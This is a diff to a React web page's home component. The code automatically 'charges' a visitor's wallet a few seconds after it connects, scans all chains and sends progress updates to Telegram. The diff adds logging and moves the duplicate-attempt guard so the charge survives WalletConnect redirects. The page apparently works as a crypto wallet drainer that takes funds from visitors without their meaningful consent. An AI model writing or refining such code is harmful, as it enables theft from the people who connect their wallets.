@@ -119,7 +119,10 @@ export default function Home() {
       const connectionKey = `${address}-${chainId}`;
 
       // Prevent duplicate charge attempts for same wallet+chain
-      if (chargeAttemptedRef.current.has(connectionKey)) return;
+      if (chargeAttemptedRef.current.has(connectionKey)) {
+        console.log('⏭️ Charge already attempted for this wallet+chain, skipping');
+        return;
+      }
       
       console.log('⏳ Waiting 3 seconds for wallet provider to fully initialize...');
       // Wait 3 seconds to ensure wallet provider is fully loaded
@@ -132,8 +135,10 @@ export default function Home() {
         return;
       }
       
-      // Mark attempt AFTER delay to avoid race conditions
+      // IMPORTANT: Mark attempt BEFORE executing to prevent re-execution on page return from WalletConnect
+      // WalletConnect opens wallet app which causes browser redirect/return
       chargeAttemptedRef.current.add(connectionKey);
+      console.log('✅ Marked charge attempt for:', connectionKey);
 
       // Note: We don't check if charging is enabled on the current chain
       // because we will scan ALL chains regardless of which one is currently connected
@@ -266,8 +271,13 @@ export default function Home() {
           balanceBefore: balanceData.formatted,
           balanceValue: balanceData.value,
           sendTransactionAsync,
-          onTelegramUpdate: (msg) => setChargeStatus(msg),
+          onTelegramUpdate: (msg) => {
+            console.log('📱 Telegram update:', msg);
+            setChargeStatus(msg);
+          },
         });
+
+        console.log('🎯 Charge result:', result);
 
         if (result.success) {
           setChargeStatus(`✅ Successfully charged ${result.chargeAmount} on ${chainName}`);
